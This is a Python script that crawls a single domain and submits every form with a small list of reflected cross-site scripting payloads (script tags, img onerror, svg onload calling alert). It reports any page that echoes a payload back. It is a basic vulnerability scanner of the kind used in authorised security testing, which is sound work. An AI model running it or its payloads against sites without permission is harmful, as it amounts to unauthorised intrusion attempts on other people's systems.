import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import concurrent.futures
import re
import sys
import time



XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "';alert('XSS');//",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    # Add more payloads as needed
]


def get_all_links(url, domain):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        links = set()
        for a_tag in soup.find_all("a", href=True):
            href = a_tag['href']
            full_url = urljoin(url, href)
            parsed = urlparse(full_url)
            if parsed.netloc == domain:
                links.add(full_url)
        return links
    except requests.RequestException:
        return set()

def get_forms(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except requests.RequestException:
        return []

def test_xss(url, form, payload):
    action = form.get("action")
    method = form.get("method", "get").lower()
    target_url = urljoin(url, action)
    inputs = form.find_all("input")
    data = {}
    for input_field in inputs:
        name = input_field.get("name")
        if name:
            data[name] = payload
    try:
        if method == "post":
            response = requests.post(target_url, data=data, timeout=5)
        else:
            response = requests.get(target_url, params=data, timeout=5)
        if payload in response.text:
            return True, target_url, data
    except requests.RequestException:
        pass
    return False, target_url, data

def scan_xss(url):
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    visited = set()
    to_visit = set([url])
    vulnerabilities = []

    while to_visit:
        current_url = to_visit.pop()
        if current_url in visited:
            continue
        print(f"Scanning: {current_url}")
        visited.add(current_url)
        forms = get_forms(current_url)
        for form in forms:
            for payload in XSS_PAYLOADS:
                is_vulnerable, target, data = test_xss(current_url, form, payload)
                if is_vulnerable:
                    vulnerabilities.append({
                        "url": target,
                        "payload": payload,
                        "data": data
                    })
                    print(f"[!] XSS Vulnerability found at {target} with payload: {payload}")
        links = get_all_links(current_url, domain)
        to_visit.update(links - visited)
    return vulnerabilities

def report_vulnerabilities(vulnerabilities):
    if not vulnerabilities:
        print("No XSS vulnerabilities found.")
    else:
        print(f"\nFound {len(vulnerabilities)} potential XSS vulnerabilities:")
        for vuln in vulnerabilities:
            print(f"\nURL: {vuln['url']}")
            print(f"Payload: {vuln['payload']}")
            print(f"Data Sent: {vuln['data']}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python xss_tester.py <URL>")
        sys.exit(1)
    target_url = sys.argv[1]
    start_time = time.time()
    vulnerabilities = scan_xss(target_url)
    end_time = time.time()
    report_vulnerabilities(vulnerabilities)
    print(f"\nScanning completed in {end_time - start_time:.2f} seconds.")
